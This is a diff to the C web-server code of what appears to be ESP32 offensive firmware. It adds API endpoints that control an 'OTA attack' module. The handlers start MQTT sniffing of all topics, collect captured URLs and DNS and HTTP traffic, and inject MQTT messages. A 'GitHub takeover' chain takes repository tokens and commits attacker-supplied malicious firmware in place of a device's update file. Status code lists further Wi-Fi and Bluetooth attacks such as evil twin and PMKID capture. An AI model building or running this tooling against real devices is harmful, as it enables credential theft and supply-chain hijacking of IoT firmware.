+    cJSON *ghidx_json      = cJSON_GetObjectItem(root, "gh_captured_url_index");
+    cfg.timeout_sec = cJSON_IsNumber(timeout_json) ? (uint32_t)timeout_json->valueint : 300;
+    if (cJSON_IsArray(devip_json) && cJSON_GetArraySize(devip_json) == 4) {
+        for (int i = 0; i < 4; i++) {
+            cJSON *byte = cJSON_GetArrayItem(devip_json, i);
+            if (cJSON_IsNumber(byte)) cfg.target_device_ip[i] = (uint8_t)byte->valueint;
+        }
+    }
+    if (cJSON_IsBool(capdns_json)) cfg.capture_dns = capdns_json->valueint;
+    if (cJSON_IsBool(caphttp_json)) cfg.capture_http = caphttp_json->valueint;
+    if (cJSON_IsString(ghpath_json)) strncpy(cfg.gh_firmware_path, ghpath_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
+    if (cJSON_IsString(ghbranch_json)) strncpy(cfg.gh_branch, ghbranch_json->valuestring, sizeof(cfg.gh_branch) - 1);
+    if (cJSON_IsString(ghcommit_json)) strncpy(cfg.gh_commit_msg, ghcommit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
+    if (cJSON_IsNumber(ghidx_json)) cfg.gh_captured_url_index = ghidx_json->valueint;
+
+    ESP_LOGI(TAG, "Starting OTA attack: mode=%d ssid=%s broker=%s:%u",
+             cfg.mode, cfg.wifi_ssid, cfg.mqtt_broker, cfg.mqtt_port);
+
+    ota_attack_start_config(&cfg);
+
+    cJSON_Delete(root);
+    return send_success_response(req);
+}
+
+static esp_err_t ota_stop_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    ESP_LOGI(TAG, "Stopping OTA attack");
+    ota_attack_stop();
+    return send_success_response(req);
+}
+
+static esp_err_t ota_status_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = ota_attack_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "running", false);
+        cJSON_AddStringToObject(fallback, "state", "idle");
+        cJSON_AddStringToObject(fallback, "mode", "SNIFF");
+        cJSON_AddNumberToObject(fallback, "mqtt_msg_count", 0);
+        cJSON_AddNumberToObject(fallback, "url_count", 0);
+        cJSON_AddNumberToObject(fallback, "github_url_count", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t ota_messages_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const char *json = ota_attack_get_captured_messages_json();
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, json ? json : "[]");
+    return ESP_OK;
+}
+
+static esp_err_t ota_urls_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const char *json = ota_attack_get_urls_json();
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, json ? json : "[]");
+    return ESP_OK;
+}
+
+static esp_err_t ota_github_urls_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const char *json = ota_attack_get_github_urls_json();
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, json ? json : "[]");
+    return ESP_OK;
+}
+
+static esp_err_t ota_inject_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[768];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *topic_json   = cJSON_GetObjectItem(root, "topic");
+    cJSON *payload_json = cJSON_GetObjectItem(root, "payload");
+    if (!cJSON_IsString(topic_json) || !cJSON_IsString(payload_json)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing topic or payload");
+        return ESP_FAIL;
+    }
+
+    bool ok = ota_attack_inject_message(topic_json->valuestring, payload_json->valuestring);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ok);
+    return send_json_response(req, resp);
+}
+
+static esp_err_t ota_download_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[128];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *index_json = cJSON_GetObjectItem(root, "url_index");
+    int url_index = cJSON_IsNumber(index_json) ? index_json->valueint : 0;
+    cJSON_Delete(root);
+
+    bool ok = ota_attack_download_firmware(url_index);
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "started", ok);
+    return send_json_response(req, resp);
+}
+
+static esp_err_t ota_download_result_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const char *json = ota_attack_get_download_result_json();
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, json ? json : "{\"success\":false}");
+    return ESP_OK;
+}
+
+static esp_err_t ota_dns_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const char *json = ota_attack_get_dns_entries_json();
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, json ? json : "[]");
+    return ESP_OK;
+}
+
+static esp_err_t ota_http_entries_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    const char *json = ota_attack_get_http_entries_json();
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, json ? json : "[]");
+    return ESP_OK;
+}
+
+/* ── GitHub Repo Operations ──────────────────────────────────── */
+
+static esp_err_t ota_github_parse_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[512];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *url_json = cJSON_GetObjectItem(root, "url");
+    if (!cJSON_IsString(url_json) || url_json->valuestring == NULL) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing url");
+        return ESP_FAIL;
+    }
+
+    ota_github_repo_t repo;
+    memset(&repo, 0, sizeof(repo));
+    bool ok = ota_attack_parse_github_url(url_json->valuestring, &repo);
+
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ok);
+    if (ok) {
+        cJSON_AddStringToObject(resp, "owner", repo.owner);
+        cJSON_AddStringToObject(resp, "repo", repo.repo);
+        cJSON_AddStringToObject(resp, "path", repo.path);
+        cJSON_AddStringToObject(resp, "branch", repo.branch);
+        if (repo.token[0]) cJSON_AddStringToObject(resp, "token", repo.token);
+        cJSON_AddBoolToObject(resp, "token_valid", repo.token_valid);
+        cJSON_AddBoolToObject(resp, "parsed", repo.parsed);
+    }
+    return send_json_response(req, resp);
+}
+
+static esp_err_t ota_github_access_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[768];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    ota_github_repo_t repo;
+    memset(&repo, 0, sizeof(repo));
+
+    cJSON *owner_json  = cJSON_GetObjectItem(root, "owner");
+    cJSON *repo_json   = cJSON_GetObjectItem(root, "repo");
+    cJSON *token_json  = cJSON_GetObjectItem(root, "token");
+    cJSON *branch_json = cJSON_GetObjectItem(root, "branch");
+
+    if (cJSON_IsString(owner_json))  strncpy(repo.owner, owner_json->valuestring, sizeof(repo.owner) - 1);
+    if (cJSON_IsString(repo_json))   strncpy(repo.repo, repo_json->valuestring, sizeof(repo.repo) - 1);
+    if (cJSON_IsString(token_json))  strncpy(repo.token, token_json->valuestring, sizeof(repo.token) - 1);
+    if (cJSON_IsString(branch_json)) strncpy(repo.branch, branch_json->valuestring, sizeof(repo.branch) - 1);
+
+    bool ok = ota_attack_github_access_repo(&repo);
+
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ok);
+    cJSON_AddBoolToObject(resp, "token_valid", repo.token_valid);
+    if (repo.token[0]) cJSON_AddStringToObject(resp, "token", repo.token);
+    return send_json_response(req, resp);
+}
+
+static esp_err_t ota_github_list_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    /* Read path from query string: ?path=firmware/ */
+    char path_buf[128] = {0};
+    if (httpd_req_get_url_query_str(req, path_buf, sizeof(path_buf)) == ESP_OK) {
+        char decoded[128] = {0};
+        if (get_form_value(path_buf, "path", decoded, sizeof(decoded))) {
+            /* decoded now has the path value */
+        }
+    }
+
+    /* Use the current GitHub repo context from ota_attack module */
+    ota_github_repo_t repo;
+    memset(&repo, 0, sizeof(repo));
+
+    /* Try to get repo info from the OTA attack module's current state */
+    const char *repo_json_str = ota_attack_get_github_repo_json();
+    if (repo_json_str && strlen(repo_json_str) > 2) {
+        cJSON *repo_obj = cJSON_Parse(repo_json_str);
+        if (repo_obj) {
+            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
+            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
+            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
+            cJSON *b = cJSON_GetObjectItem(repo_obj, "branch");
+            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
+            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
+            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
+            if (cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
+            cJSON_Delete(repo_obj);
+        }
+    }
+
+    const char *list_path = path_buf[0] ? path_buf : "";
+    const char *result = ota_attack_github_list_files(&repo, list_path);
+
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, result ? result : "{\"files\":[],\"error\":\"no repo context\"}");
+    return ESP_OK;
+}
+
+static esp_err_t ota_github_file_sha_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[256];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) return ESP_FAIL;
+
+    cJSON *file_path_json = cJSON_GetObjectItem(root, "file_path");
+    if (!cJSON_IsString(file_path_json)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing file_path");
+        return ESP_FAIL;
+    }
+
+    /* Get current repo context */
+    ota_github_repo_t repo;
+    memset(&repo, 0, sizeof(repo));
+    const char *repo_json_str = ota_attack_get_github_repo_json();
+    if (repo_json_str && strlen(repo_json_str) > 2) {
+        cJSON *repo_obj = cJSON_Parse(repo_json_str);
+        if (repo_obj) {
+            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
+            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
+            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
+            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
+            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
+            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
+            cJSON_Delete(repo_obj);
+        }
+    }
+
+    bool ok = ota_attack_github_get_file_sha(&repo, file_path_json->valuestring);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ok);
+    if (ok && repo.file_sha[0]) {
+        cJSON_AddStringToObject(resp, "sha", repo.file_sha);
+    }
+    return send_json_response(req, resp);
+}
+
+static esp_err_t ota_github_upload_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[512];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) return ESP_FAIL;
+
+    cJSON *fw_path_json   = cJSON_GetObjectItem(root, "firmware_path");
+    cJSON *commit_msg_json = cJSON_GetObjectItem(root, "commit_msg");
+    cJSON *fw_data_json   = cJSON_GetObjectItem(root, "firmware_hex");
+    cJSON *fw_size_json   = cJSON_GetObjectItem(root, "firmware_size");
+
+    /* Get repo context */
+    ota_github_repo_t repo;
+    memset(&repo, 0, sizeof(repo));
+    const char *repo_json_str = ota_attack_get_github_repo_json();
+    if (repo_json_str && strlen(repo_json_str) > 2) {
+        cJSON *repo_obj = cJSON_Parse(repo_json_str);
+        if (repo_obj) {
+            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
+            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
+            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
+            cJSON *b = cJSON_GetObjectItem(repo_obj, "branch");
+            cJSON *s = cJSON_GetObjectItem(repo_obj, "file_sha");
+            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
+            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
+            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
+            if (cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
+            if (cJSON_IsString(s)) strncpy(repo.file_sha, s->valuestring, sizeof(repo.file_sha) - 1);
+            cJSON_Delete(repo_obj);
+        }
+    }
+
+    const char *target_path = cJSON_IsString(fw_path_json) ? fw_path_json->valuestring : "firmware.bin";
+    const char *commit_msg  = cJSON_IsString(commit_msg_json) ? commit_msg_json->valuestring : "Update firmware";
+
+    /* Parse hex firmware data if provided, otherwise use downloaded firmware from OTA module */
+    bool ok = false;
+    if (cJSON_IsString(fw_data_json) && cJSON_IsNumber(fw_size_json)) {
+        const char *hex = fw_data_json->valuestring;
+        size_t hex_len = strlen(hex);
+        uint32_t fw_size = (uint32_t)fw_size_json->valueint;
+
+        if (hex_len > 0 && fw_size > 0 && hex_len / 2 <= OTA_MAX_FIRMWARE_SIZE) {
+            uint8_t *fw_data = malloc(fw_size);
+            if (fw_data) {
+                for (uint32_t i = 0; i < fw_size && i * 2 + 1 < hex_len; i++) {
+                    unsigned int byte;
+                    if (sscanf(hex + i * 2, "%02x", &byte) == 1) {
+                        fw_data[i] = (uint8_t)byte;
+                    }
+                }
+                ok = ota_attack_github_upload_firmware(&repo, fw_data, fw_size, target_path, commit_msg);
+                free(fw_data);
+            }
+        }
+    }
+
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ok);
+    return send_json_response(req, resp);
+}
+
+static esp_err_t ota_github_repo_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, ota_attack_get_github_repo_json());
+    return ESP_OK;
+}
+
+static esp_err_t ota_github_result_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_sendstr(req, ota_attack_get_github_result_json());
+    return ESP_OK;
+}
+
+static esp_err_t ota_chain_handler(httpd_req_t *req) {
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char content[1024];
+    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
+    if (ret <= 0) return ESP_FAIL;
+    content[ret] = '\0';
+
+    cJSON *root = cJSON_Parse(content);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *ssid_json     = cJSON_GetObjectItem(root, "wifi_ssid");
+    cJSON *pass_json     = cJSON_GetObjectItem(root, "wifi_password");
+    cJSON *broker_json   = cJSON_GetObjectItem(root, "mqtt_broker");
+    cJSON *port_json     = cJSON_GetObjectItem(root, "mqtt_port");
+    cJSON *wait_json     = cJSON_GetObjectItem(root, "wait_for_device_sec");
+    cJSON *fw_path_json  = cJSON_GetObjectItem(root, "gh_firmware_path");
+    cJSON *gh_branch_json = cJSON_GetObjectItem(root, "gh_branch");
+    cJSON *gh_commit_json = cJSON_GetObjectItem(root, "gh_commit_msg");
+    cJSON *gh_idx_json   = cJSON_GetObjectItem(root, "gh_captured_url_index");
+
+    const char *ssid   = cJSON_IsString(ssid_json) ? ssid_json->valuestring : "";
+    const char *pass   = cJSON_IsString(pass_json) ? pass_json->valuestring : "";
+    const char *broker = cJSON_IsString(broker_json) ? broker_json->valuestring : "";
+    uint16_t port      = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
+    uint32_t wait_sec  = cJSON_IsNumber(wait_json) ? (uint32_t)wait_json->valueint : 300;
+
+    /* Start GITHUB_TAKEOVER mode via the full config API */
+    ota_attack_config_t cfg = {
+        .mode               = OTA_MODE_GITHUB_TAKEOVER,
+        .mqtt_port          = port,
+        .subscribe_topic    = "#",
+        .inject_count       = 1,
+        .inject_interval_ms = 0,
+        .verify_ssl         = false,
+        .timeout_sec        = wait_sec,
+        .gh_captured_url_index = -1,
+        .malicious_firmware = NULL,
+        .malicious_firmware_size = 0,
+    };
+    strncpy(cfg.wifi_ssid, ssid, sizeof(cfg.wifi_ssid) - 1);
+    strncpy(cfg.wifi_password, pass, sizeof(cfg.wifi_password) - 1);
+    strncpy(cfg.mqtt_broker, broker, sizeof(cfg.mqtt_broker) - 1);
+    strncpy(cfg.mqtt_client_id, "omega_ota_gh", sizeof(cfg.mqtt_client_id) - 1);
+
+    if (cJSON_IsString(fw_path_json))
+        strncpy(cfg.gh_firmware_path, fw_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
+    else
+        strncpy(cfg.gh_firmware_path, "firmware.bin", sizeof(cfg.gh_firmware_path) - 1);
+
+    if (cJSON_IsString(gh_branch_json))
+        strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
+    else
+        strncpy(cfg.gh_branch, "main", sizeof(cfg.gh_branch) - 1);
+
+    if (cJSON_IsString(gh_commit_json))
+        strncpy(cfg.gh_commit_msg, gh_commit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
+    else
+        strncpy(cfg.gh_commit_msg, "Update firmware", sizeof(cfg.gh_commit_msg) - 1);
+
+    if (cJSON_IsNumber(gh_idx_json))
+        cfg.gh_captured_url_index = gh_idx_json->valueint;
+
+    ESP_LOGI(TAG, "Starting OTA full chain: ssid=%s broker=%s port=%u", ssid, broker, port);
+
+    ota_attack_init();
+    ota_attack_start_config(&cfg);
+
+    cJSON_Delete(root);
+    return send_success_response(req);
+}
+
+/* ================================================================== */
 /*  STATUS / STOP HANDLERS                                             */
 /* ================================================================== */
 
@@ -1881,6 +2218,7 @@ static esp_err_t status_api_handler(httpd_req_t *req) {
     cJSON_AddBoolToObject(response, "ble_spoof_running", ble_spoof_is_running());
     cJSON_AddBoolToObject(response, "ble_passkey_running", ble_passkey_is_running());
     cJSON_AddBoolToObject(response, "ble_takeover_running", ble_takeover_is_running());
+    cJSON_AddBoolToObject(response, "ota_running", ota_attack_is_running());
     cJSON_AddBoolToObject(response, "eviltwin_running", attack_eviltwin_is_running());
     cJSON_AddBoolToObject(response, "probe_running", attack_probe_is_running());
     cJSON_AddBoolToObject(response, "pmkid_running", attack_pmkid_is_running());
@@ -1904,16 +2242,6 @@ static esp_err_t status_api_handler(httpd_req_t *req) {
     }
     if (ble_deauth_is_running()) {
         cJSON_AddStringToObject(response, "ble_deauth", "BLE deauth active");
-        cJSON_AddNumberToObject(response, "ble_deauth_phase", ble_deauth_get_current_phase());
-        cJSON_AddNumberToObject(response, "ble_deauth_connects", ble_deauth_get_connect_count());
-        cJSON_AddNumberToObject(response, "ble_deauth_deauths", ble_deauth_get_deauth_count());
-        cJSON_AddNumberToObject(response, "ble_deauth_remaining", ble_deauth_get_remaining_sec());
-    }
-    if (ble_connect_flood_is_running()) {
-        cJSON_AddStringToObject(response, "ble_connect", "BLE connect flood active");
-    }
-    if (ble_l2cap_flood_is_running()) {
-        cJSON_AddStringToObject(response, "ble_l2cap", "BLE L2CAP flood active");
     }
     if (ble_spoof_is_running()) {
         const char *mode_str = (ble_spoof_get_mode() == BLE_SPOOF_MODE_CLONE) 
@@ -1922,15 +2250,18 @@ static esp_err_t status_api_handler(httpd_req_t *req) {
     }
     if (ble_passkey_is_running()) {
         cJSON_AddStringToObject(response, "ble_passkey", "BLE passkey capture active");
-        cJSON_AddStringToObject(response, "ble_passkey_method", ble_passkey_get_method());
-        cJSON_AddNumberToObject(response, "ble_passkey_remaining", ble_passkey_get_remaining_sec());
     }
     if (ble_takeover_is_running()) {
         cJSON_AddStringToObject(response, "ble_takeover", "BLE device takeover active");
-        cJSON_AddStringToObject(response, "ble_takeover_state", ble_takeover_get_state_str());
-        cJSON_AddNumberToObject(response, "ble_takeover_services", ble_takeover_get_svc_count());
-        cJSON_AddNumberToObject(response, "ble_takeover_chars", ble_takeover_get_chr_count());
-        cJSON_AddNumberToObject(response, "ble_takeover_remaining", ble_takeover_get_remaining_sec());
+    }
+    if (ota_attack_is_running()) {
+        cJSON_AddStringToObject(response, "ota", "OTA attack active");
+        cJSON_AddStringToObject(response, "ota_state", ota_attack_get_state_str());
+        cJSON_AddNumberToObject(response, "ota_mqtt_msgs", ota_attack_get_mqtt_msg_count());
+        cJSON_AddNumberToObject(response, "ota_urls", ota_attack_get_url_count());
+        cJSON_AddNumberToObject(response, "ota_github_urls", ota_attack_get_github_url_count());
+        cJSON_AddNumberToObject(response, "ota_elapsed", ota_attack_get_elapsed_sec());
+        cJSON_AddNumberToObject(response, "ota_remaining", ota_attack_get_remaining_sec());
     }
     if (attack_pmkid_is_running()) {
         cJSON_AddStringToObject(response, "pmkid", "PMKID capture active");
@@ -2029,6 +2360,7 @@ static esp_err_t stop_all_handler(httpd_req_t *req) {
     ble_spoof_stop();
     ble_passkey_stop();
     ble_takeover_stop();
+    ota_attack_stop();
 
     return send_success_response(req);
 }
@@ -2041,7 +2373,7 @@ void start_web_server(void) {
     httpd_handle_t server = NULL;
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.lru_purge_enable = true;
-    config.max_uri_handlers = 256;
+    config.max_uri_handlers = 96;
     config.recv_wait_timeout = 10;
     config.stack_size = 16384;
     
@@ -2155,34 +2487,24 @@ void start_web_server(void) {
         httpd_register_uri_handler(server, &ble_spoof_start_uri);
         httpd_uri_t ble_spoof_stop_uri = { .uri = "/api/ble/spoof/stop", .method = HTTP_POST, .handler = ble_spoof_stop_handler };
         httpd_register_uri_handler(server, &ble_spoof_stop_uri);
-        httpd_uri_t ble_spoof_status_uri = { .uri = "/api/ble/spoof/status", .method = HTTP_GET, .handler = ble_spoof_status_handler };
-        httpd_register_uri_handler(server, &ble_spoof_status_uri);
         httpd_uri_t ble_spoof_clone_uri = { .uri = "/api/ble/spoof/clone", .method = HTTP_POST, .handler = ble_spoof_clone_handler };
         httpd_register_uri_handler(server, &ble_spoof_clone_uri);
         httpd_uri_t ble_connect_start_uri = { .uri = "/api/ble/connect/start", .method = HTTP_POST, .handler = ble_connect_start_handler };
         httpd_register_uri_handler(server, &ble_connect_start_uri);
         httpd_uri_t ble_connect_stop_uri = { .uri = "/api/ble/connect/stop", .method = HTTP_POST, .handler = ble_connect_stop_handler };
         httpd_register_uri_handler(server, &ble_connect_stop_uri);
-        httpd_uri_t ble_connect_status_uri = { .uri = "/api/ble/connect/status", .method = HTTP_GET, .handler = ble_connect_status_handler };
-        httpd_register_uri_handler(server, &ble_connect_status_uri);
         httpd_uri_t ble_l2cap_start_uri = { .uri = "/api/ble/l2cap/start", .method = HTTP_POST, .handler = ble_l2cap_start_handler };
         httpd_register_uri_handler(server, &ble_l2cap_start_uri);
         httpd_uri_t ble_l2cap_stop_uri = { .uri = "/api/ble/l2cap/stop", .method = HTTP_POST, .handler = ble_l2cap_stop_handler };
         httpd_register_uri_handler(server, &ble_l2cap_stop_uri);
-        httpd_uri_t ble_l2cap_status_uri = { .uri = "/api/ble/l2cap/status", .method = HTTP_GET, .handler = ble_l2cap_status_handler };
-        httpd_register_uri_handler(server, &ble_l2cap_status_uri);
         httpd_uri_t ble_gatt_start_uri = { .uri = "/api/ble/gatt/start", .method = HTTP_POST, .handler = ble_gatt_start_handler };
         httpd_register_uri_handler(server, &ble_gatt_start_uri);
         httpd_uri_t ble_gatt_stop_uri = { .uri = "/api/ble/gatt/stop", .method = HTTP_POST, .handler = ble_gatt_stop_handler };
         httpd_register_uri_handler(server, &ble_gatt_stop_uri);
-        httpd_uri_t ble_gatt_status_uri = { .uri = "/api/ble/gatt/status", .method = HTTP_GET, .handler = ble_gatt_status_handler };
-        httpd_register_uri_handler(server, &ble_gatt_status_uri);
         httpd_uri_t ble_deauth_start_uri = { .uri = "/api/ble/deauth/start", .method = HTTP_POST, .handler = ble_deauth_start_handler };
         httpd_register_uri_handler(server, &ble_deauth_start_uri);
         httpd_uri_t ble_deauth_stop_uri = { .uri = "/api/ble/deauth/stop", .method = HTTP_POST, .handler = ble_deauth_stop_handler };
         httpd_register_uri_handler(server, &ble_deauth_stop_uri);
-        httpd_uri_t ble_deauth_status_uri = { .uri = "/api/ble/deauth/status", .method = HTTP_GET, .handler = ble_deauth_status_handler };
-        httpd_register_uri_handler(server, &ble_deauth_status_uri);
         httpd_uri_t ble_passkey_start_uri = { .uri = "/api/ble/passkey/start", .method = HTTP_POST, .handler = ble_passkey_start_handler };
         httpd_register_uri_handler(server, &ble_passkey_start_uri);
         httpd_uri_t ble_passkey_stop_uri = { .uri = "/api/ble/passkey/stop", .method = HTTP_POST, .handler = ble_passkey_stop_handler };
@@ -2207,12 +2529,54 @@ void start_web_server(void) {
         httpd_register_uri_handler(server, &ble_takeover_notifs_uri);
         httpd_uri_t stop_all = { .uri = "/api/stop/all", .method = HTTP_POST, .handler = stop_all_handler };
         httpd_register_uri_handler(server, &stop_all);
+
+        /* OTA Attack API */
+        httpd_uri_t ota_start_uri = { .uri = "/api/ota/start", .method = HTTP_POST, .handler = ota_start_handler };
+        httpd_register_uri_handler(server, &ota_start_uri);
+        httpd_uri_t ota_stop_uri = { .uri = "/api/ota/stop", .method = HTTP_POST, .handler = ota_stop_handler };
+        httpd_register_uri_handler(server, &ota_stop_uri);
+        httpd_uri_t ota_status_uri = { .uri = "/api/ota/status", .method = HTTP_GET, .handler = ota_status_handler };
+        httpd_register_uri_handler(server, &ota_status_uri);
+        httpd_uri_t ota_messages_uri = { .uri = "/api/ota/messages", .method = HTTP_GET, .handler = ota_messages_handler };
+        httpd_register_uri_handler(server, &ota_messages_uri);
+        httpd_uri_t ota_urls_uri = { .uri = "/api/ota/urls", .method = HTTP_GET, .handler = ota_urls_handler };
+        httpd_register_uri_handler(server, &ota_urls_uri);
